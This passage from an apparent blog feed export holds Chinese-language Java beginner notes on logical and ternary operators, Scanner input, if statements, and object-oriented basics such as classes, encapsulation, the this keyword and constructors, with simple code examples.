class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">3</span>;<span class="keyword">int</span> y = <span class="number">4</span>;System.out.println((x++ &gt; <span class="number">4</span>) &amp; (y++ &gt; <span class="number">5</span>)); <span class="comment">// 两个表达都会运算 System.out.println(x); // 4 System.out.println(y); // 5 System.out.println((x++ &gt; 4) &amp;&amp; (y++ &gt; 5)); // 左边已经可以确定结果为false，右边不参与运算 System.out.println(x); // 4 System.out.println(y); // 4</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><ul><li><h2 id="三元运算符语法格式"><a href="#三元运算符语法格式" class="headerlink" title="三元运算符语法格式"></a>三元运算符语法格式</h2><ul><li><p><code>关系表达式 ? 表达式1 : 表达式2;</code></p></li><li><p>问号前面的位置是判断的条件，判断结果为boolean型，为true时调用表达式1，为false时调用表达式2。其逻辑为：如果条件表达式成立或者满足则执行表达式1，否则执行第二个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;<span class="keyword">int</span> b = <span class="number">20</span>;<span class="keyword">int</span> c = a &gt; b ? a : b; <span class="comment">// 判断 a&gt;b 是否为真，如果为真取a的值，如果为假，取b的值</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="数据输入"><a href="#数据输入" class="headerlink" title="数据输入"></a>数据输入</h2><ul><li><h2 id="以通过-Scanner-类来获取用户的输入"><a href="#以通过-Scanner-类来获取用户的输入" class="headerlink" title="以通过 Scanner 类来获取用户的输入"></a>以通过 Scanner 类来获取用户的输入</h2><ol><li><p>导包, Scanner 类在java.util包下，所以需要将该类导入, 导包的语句需要定义在类的上面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br></pre></td></tr></table></figure></li><li><p>创建scanner对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);<span class="comment">// 创建Scanner对象，sc表示变量名，其他均不可变</span></span><br></pre></td></tr></table></figure></li><li><p>接收数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = sc.nextInt(); <span class="comment">// 表示将键盘录入的值作为int数返回。</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//创建对象 </span></span><br><span class="line">    Scanner sc = <span class="keyword">new</span> Scanner(System.in); </span><br><span class="line">    <span class="comment">//接收数据 </span></span><br><span class="line">    <span class="keyword">int</span> x = sc.nextInt(); </span><br><span class="line">    <span class="comment">//输出数据 </span></span><br><span class="line">    System.out.println(<span class="string">&quot;x:&quot;</span> + x); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h1><ul><li><h2 id="流程控制语句分类"><a href="#流程控制语句分类" class="headerlink" title="流程控制语句分类"></a>流程控制语句分类</h2><ul><li><h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2></li><li>分支结构(if, switch)</li><li>循环结构(for, while, do…while)</li></ul></li><li><h2 id="顺序结构-1"><a href="#顺序结构-1" class="headerlink" title="顺序结构"></a>顺序结构</h2><ul><li><p>顺序结构是程序中最简单最基本的流程控制，没有特定的语法结构，按照代码的先后顺序，依次执行，程序中大多数的代码都是这样执行的</p></li><li><p>顺序结构的流程图:</p><center>   <img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110061500594.png" width="30%">   </center></li></ul></li></ul><p>​        </p><ul><li><h1 id="if语句格式1"><a href="#if语句格式1" class="headerlink" title="if语句格式1"></a>if语句格式1</h1><ul><li><h2 id="if语句格式"><a href="#if语句格式" class="headerlink" title="if语句格式"></a>if语句格式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式： <span class="keyword">if</span> (关系表达式) &#123;</span><br><span class="line">  语句体; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li><p>首先计算关系表达式的值</p></li><li><p>如果关系表达式的值为true就执行语句体</p></li><li><p>如果关系表达式的值为false就不执行语句体</p></li><li><p>继续执行后面的语句内容</p><center><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110061513111.png" width="50%"></center></li><li><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IfDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;开始&quot;</span>); <span class="comment">//定义两个变量 </span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>; </span><br><span class="line">    <span class="comment">//需求：判断a和b的值是否相等，如果相等，就在控制台输出：a等于b </span></span><br><span class="line">    <span class="keyword">if</span>(a == b) &#123; System.out.println(<span class="string">&quot;a等于b&quot;</span>); &#125;</span><br><span class="line">    <span class="comment">//需求：判断a和c的值是否相等，如果相等，就在控制台输出：a等于c </span></span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">if</span>(a == c) &#123; </span><br><span class="line">      System.out.println(<span class="string">&quot;a等于c&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;结束&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><h1 id="if语句格式2"><a href="#if语句格式2" class="headerlink" title="if语句格式2"></a>if语句格式2</h1></li><li><h2 id="执行流程-1"><a href="#执行流程-1" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li><p>首先计算关系表达式的值</p></li><li><p>如果关系表达式的值为true就执行语句体1</p></li><li><p>如果关系表达式的值为false就执行语句体2</p></li><li><p>继续执行后面的语句内容</p><center><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110061527744.png" width="50%"></center></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IfDemo02</span> </span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;开始&quot;</span>); </span><br><span class="line">  <span class="comment">//定义两个变量 </span></span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">10</span>; </span><br><span class="line">  <span class="keyword">int</span> b = <span class="number">20</span>; </span><br><span class="line">  b = <span class="number">5</span>; <span class="comment">//需求：判断a是否大于b，如果是，在控制台输出：a的值大于b，否则，在控制台输出：a的值不大于b </span></span><br><span class="line">  <span class="keyword">if</span>(a &gt; b) &#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;a的值大于b&quot;</span>); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;a的值不大于b&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  System.out.println(<span class="string">&quot;结束&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li><h1 id="if语句格式3"><a href="#if语句格式3" class="headerlink" title="if语句格式3"></a>if语句格式3</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式： </span><br><span class="line">  <span class="keyword">if</span> (关系表达式<span class="number">1</span>) &#123; </span><br><span class="line">    语句体<span class="number">1</span>; </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (关系表达式<span class="number">2</span>) &#123;</span><br><span class="line">    语句体<span class="number">2</span>; </span><br><span class="line">  &#125;…<span class="keyword">else</span> &#123;</span><br><span class="line">    语句体n+<span class="number">1</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><h2 id="执行流程-2"><a href="#执行流程-2" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li><p>首先计算关系表达式1的值</p></li><li><p>如果值为true就执行语句体1；如果值为false就计算关系表达式2的值</p></li><li><p>如果值为true就执行语句体2；如果值为false就计算关系表达式3的值</p></li><li><p>…</p></li><li><p>如果没有任何关系表达式为true，就执行语句体n+1</p><center>    <img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110061541304.png"/> </center></li></ol></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象</title>
      <link href="/2021/11/04/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/11/04/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<center><H1>面向对象</H1></center><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><ul><li><p>客观存在的事物称为对象，所以常常说万物皆对象</p></li><li><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li>类的理解<ul><li>类是对现实生活中一类具有共同属性行为的事物的抽象</li><li>类是对象的数据行为，类是具有共同属性行为的一组对象集合</li><li>简单理解 类就是对现实事物的一种描述</li></ul></li><li>类的组成<ul><li>属性：指事物的特征，例如：手机事物（品牌，价格，尺寸）</li><li>行为：指事物能执行的操作，例如：手机事物（打电话，发短信）</li></ul></li></ul></li><li><h2 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h2><ul><li>类：类是对现实生活中一类具有共同属性和行为的事物的抽象</li><li>对象：是能够看得到摸的着的真实存在的实体</li><li>简单理解：类是对事物的一种描述，对象则为具体存在的事物</li></ul></li></ul><hr><h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><ul><li><h2 id="类的组成是由属性和行为两部分组成"><a href="#类的组成是由属性和行为两部分组成" class="headerlink" title="类的组成是由属性和行为两部分组成"></a>类的组成是由属性和行为两部分组成</h2><ul><li>属性：在类中通过成员变量来体现（类中方法外的变量）</li><li>行为：在类中通过成员方法来体现（和前面的方法相比去掉static关键字即可）</li></ul></li><li><h2 id="类的定义步骤"><a href="#类的定义步骤" class="headerlink" title="类的定义步骤"></a>类的定义步骤</h2><ol><li><p>定义类</p></li><li><p>编写类的成员变量</p><ol><li><p>编写类的成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名 </span>&#123; </span><br><span class="line">  <span class="comment">// 成员变量 </span></span><br><span class="line">  变量<span class="number">1</span>的数据类型 变量<span class="number">1</span>； </span><br><span class="line">  变量<span class="number">2</span>的数据类型 变量<span class="number">2</span>;</span><br><span class="line">  …</span><br><span class="line">  <span class="comment">// 成员方法 </span></span><br><span class="line">  方法<span class="number">1</span>; </span><br><span class="line">  方法<span class="number">2</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 手机类：</span></span><br><span class="line"><span class="comment">     类名：</span></span><br><span class="line"><span class="comment">      手机(Phone) </span></span><br><span class="line"><span class="comment">      成员变量：</span></span><br><span class="line"><span class="comment">      品牌(brand) </span></span><br><span class="line"><span class="comment">      价格(price) </span></span><br><span class="line"><span class="comment">      成员方法： </span></span><br><span class="line"><span class="comment">      打电话(call)</span></span><br><span class="line"><span class="comment">      发短信(sendMessage) */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123; </span><br><span class="line">  <span class="comment">//成员变量 </span></span><br><span class="line">  String brand; </span><br><span class="line">  <span class="keyword">int</span> price; </span><br><span class="line">  <span class="comment">//成员方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;打电话&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendMessage</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;发短信&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ul><hr><h2 id="对象的使用"><a href="#对象的使用" class="headerlink" title="对象的使用"></a>对象的使用</h2><ul><li><p>创建对象的格式:</p><ul><li>类名 对象名 = new 类名();</li></ul></li><li><p>调用成员的格式</p><ul><li>对象名.成员变量</li><li>对象名.成员方法();</li></ul></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建对象格式：</span></span><br><span class="line"><span class="comment">      类名 对象名 = new 类名();</span></span><br><span class="line"><span class="comment">      范例：Phone p = new Phone(); </span></span><br><span class="line"><span class="comment">      使用对象</span></span><br><span class="line"><span class="comment">          1：使用成员变量 </span></span><br><span class="line"><span class="comment">              格式：对象名.变量名 </span></span><br><span class="line"><span class="comment">              范例：p.brand </span></span><br><span class="line"><span class="comment">          2：使用成员方法 </span></span><br><span class="line"><span class="comment">             格式：对象名.方法名() </span></span><br><span class="line"><span class="comment">             范例：p.call() </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhoneDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建对象</span></span><br><span class="line">    Phone p = <span class="keyword">new</span> Phone(); <span class="comment">//使用成员变量</span></span><br><span class="line">    System.out.println(p.brand); </span><br><span class="line">    System.out.println(p.price); </span><br><span class="line">    p.brand = <span class="string">&quot;小米&quot;</span>;</span><br><span class="line">    p.price = <span class="number">2999</span>; </span><br><span class="line">    System.out.println(p.brand); </span><br><span class="line">    System.out.println(p.price); </span><br><span class="line">    <span class="comment">//使用成员方法 </span></span><br><span class="line">    p.call(); </span><br><span class="line">    p.sendMessage(); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h1><ul><li>成员变量和局部变量的区别<ul><li>类中位置不同 成员变量（类中方法外）局部变量（方法内部或方法声明上）</li><li>内存中位置不同：成员变量（堆内存）局部变量（栈内存）</li><li>生命周期不同：成员变量（随着对象的存在而存在，随着对象的消失而消失）局部变量（随着方法的调用而存在，醉着方法的调用完毕而消失）</li><li>初始化值不同：成员变量（有默认初始化值）局部变量（没有默认初始化值，必须先定义，赋值才能使用）</li></ul></li></ul><hr><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><ul><li><h2 id="private关键字"><a href="#private关键字" class="headerlink" title="private关键字"></a>private关键字</h2><ul><li><p>private是一个修饰符 可以用来修饰成员(成员变量，成员方法)</p></li><li><p>被private修饰的成员，只能在本类进行访问，针对private修饰的成员变量，如果需要被其他类使用，提供相应的操作</p><ul><li><p>提供“get变量名()”方法，用于获取成员变量的值，方法用public修饰</p></li><li><p>提供“set变量名(参数)”方法，用于设置成员变量的值，方法用public修饰</p></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 学生类 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123; </span><br><span class="line">  <span class="comment">//成员变量 </span></span><br><span class="line">  String name; </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age; </span><br><span class="line">  <span class="comment">//提供get/set方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">0</span> || a&gt;<span class="number">120</span>) &#123; </span><br><span class="line">      System.out.println(<span class="string">&quot;你给的年龄有误&quot;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">      age = a; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> age; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//成员方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(name + <span class="string">&quot;,&quot;</span> + age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 学生测试类 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//创建对象 </span></span><br><span class="line">    Student s = <span class="keyword">new</span> Student(); </span><br><span class="line">    <span class="comment">//给成员变量赋值 </span></span><br><span class="line">    s.name = <span class="string">&quot;林青霞&quot;</span>; </span><br><span class="line">    s.setAge(<span class="number">30</span>); </span><br><span class="line">    <span class="comment">//调用show方法 </span></span><br><span class="line">    s.show(); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr></li><li><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2></li><li><ul><li><p>this修饰的变量指代成员变量， 其主要作用是(区分局部变量和成员变量的重名问题)</p><ul><li><p>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量</p></li><li><p>方法的形参没有与成员变量同名，不带this的变量指的是成员变量</p></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123; </span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; t</span><br><span class="line">    his.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> age; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(name + <span class="string">&quot;,&quot;</span> + age); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>this代表当前调用方法的引用，哪个对象调用的方法，this就代表哪一个对象</p></blockquote></li></ul></li></ul><hr></li><li><h2 id="封装的思想"><a href="#封装的思想" class="headerlink" title="封装的思想"></a>封装的思想</h2><ol><li>封装的概述 是面向对象三大特征之一(封装、继承、多态)是面向对象编程语言对客观世界的模拟，客观世界米成员变量都是隐藏在对象内部的，外界是无法操作的</li><li> 封装原则 将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问 成员变量private，提供对应的getXxx()/setXxx()方法</li><li>封装好处 通过方法来控制成员变量的操作，提高了代码的安全性 把代码用方法进行封装，提高了代码的复用性</li></ol></li></ul><hr><h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><ul><li><h2 id="构造方法的概述"><a href="#构造方法的概述" class="headerlink" title="构造方法的概述"></a>构造方法的概述</h2><ul><li><p>构造方法是一种特殊的方法</p></li><li><p>作用</p><ul><li>创建对象</li></ul></li><li><p>格式</p><ul><li><code>public class 类名&#123;修饰符 类名( 参数 ) &#123;&#125; &#125;</code></li></ul></li><li><p>功能</p><ul><li>主要完成对象的初始化</li></ul></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String name; </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age; </span><br><span class="line">  <span class="comment">//构造方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;无参构造方法&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(name + <span class="string">&quot;,&quot;</span> + age); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 测试类 */</span> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建对象 </span></span><br><span class="line">    Student s = <span class="keyword">new</span> Student(); </span><br><span class="line">    s.show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr></li><li><h2 id="构造方法的注意事项"><a href="#构造方法的注意事项" class="headerlink" title="构造方法的注意事项"></a>构造方法的注意事项</h2><ul><li><p>构造方法创建</p><ul><li>如果没有定义构造方法 系统将会给出一个默认的无参构造方法 如果定义了构造方法 系统将不再提供默认的构造方法</li></ul></li><li><p>构造方法的重载</p><ul><li>如果自定义了带参构造方法 还要使用无参构造方法 就必须再写一个无参构造方法</li></ul></li><li><p>推荐的使用方式</p><ul><li>无论是否使用，都手工书写午餐构造方法</li></ul></li><li><p>重要功能</p><ul><li>可以使用带参构造，为成员变量进行初始化</li></ul></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 学生类 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123; </span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span 